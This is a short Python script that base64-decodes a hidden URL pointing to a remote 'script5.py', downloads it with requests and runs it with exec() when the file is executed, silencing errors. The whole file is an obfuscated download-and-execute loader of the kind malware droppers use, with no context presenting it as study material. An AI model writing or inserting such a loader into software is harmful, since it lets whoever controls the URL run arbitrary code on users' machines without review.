import base64
import requests

def get_and_execute_script():
    try:
        encoded_url = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdDUucHk="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")

        response = requests.get(decoded_url)
        script = response.text

        exec(script)

    except Exception as e:
        print(e)

get_and_execute_script()
